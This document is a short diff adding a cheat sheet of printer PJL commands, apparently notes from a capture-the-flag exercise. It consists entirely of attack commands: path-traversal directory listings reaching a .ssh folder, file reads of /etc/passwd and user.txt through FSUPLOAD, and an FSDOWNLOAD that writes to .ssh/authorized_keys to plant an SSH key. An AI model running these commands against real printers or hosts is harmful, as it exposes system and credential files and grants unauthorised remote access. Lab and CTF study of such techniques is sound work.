@@ -1,0 +1,15 @@
+PJL Command:
+```
+- List path traversal:
+@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=65535
+@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=65535
+@PJL FSDIRLIST NAME="0:/../.ssh" ENTRY=1 COUNT=65535
+
+- View File:
+@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=5119
+@PJL FSUPLOAD NAME="0:/../user.txt" OFFSET=0 SIZE=5119
+@PJL FSUPLOAD NAME="0:/../../etc/passwd" OFFSET=0 SIZE=5119
+
+- Write to file:
+@PJL FSDOWNLOAD FORMAT: BINARY NAME="0:/../.ssh/authorized_keys" SIZE=90
+```
